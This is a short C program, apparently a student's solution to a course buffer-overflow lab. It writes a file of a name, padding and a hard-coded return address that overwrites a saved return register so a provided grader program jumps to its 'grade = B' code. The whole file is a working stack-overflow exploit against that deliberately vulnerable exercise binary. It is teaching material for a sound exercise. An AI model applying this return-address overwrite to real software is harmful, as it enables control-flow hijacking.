/*--------------------------------------------------------------------*/
/* createDataB.c                                                      */
/* Author: David Hovey                                                */
/*--------------------------------------------------------------------*/

/*
This file Produces a file called dataB with the student name, a
nullbyte, padding to overrun the stack, and the address of the
instruction in main to get a B, the latter of which will overwrite
getName's stored x30
*/

#include <stdio.h>
#include <string.h>



/*
   main

   Writes a crafted input file named "dataB" used to attack the
   grader program.

   The function:
   - Accepts no command-line arguments.
   - Does not read from stdin.
   - Writes binary data only to the file "dataB".
   - On failure to open the file, prints an error message to stderr
     via perror and returns 1.
   - On success, writes the exploit bytes to "dataB" and returns 0.
*/

int main() {


    /* Name that grader will print */
    char name[] = "David";

    /* padding bytes to fill buf and reach saved return address */
    char whitespace[] = "gggggggggggggggggggggggggggggggggggggggggg";

    /* Address of the 'grade = B' instruction in main */
    long returnAddress = 0x400890;

    /* Open dataB for writing the crafted input bytes. */
    FILE *psFile = fopen("dataB", "w");

    if (!psFile) {
        perror("fopen did not return a valid pointer");
        return 1;
    }

    /*
      Write the student's name plus its terminating null byte.
      This fills the name[] buffer in the BSS as expected.
   */
    fwrite(&name, strlen(name) + 1, 1, psFile); /* Check case that this does not return */

    /*
      Write padding bytes that overflow readString's local buf
      and continue writing into the stack frame up to the stored
      return address from getName.
   */
    fwrite(&whitespace, strlen(whitespace), 1, psFile);

    /*
      Overwrite getName's saved x30 with the address of the
      'grade = B' instruction in main. When getName returns,
      control will jump directly to that instruction, causing
      the program to assign grade 'B' regardless of the name.
   */
    fwrite(&returnAddress, sizeof(long), 1, psFile);


    /* Close the output file and finish successfully. */
    fclose(psFile);

    return 0;
}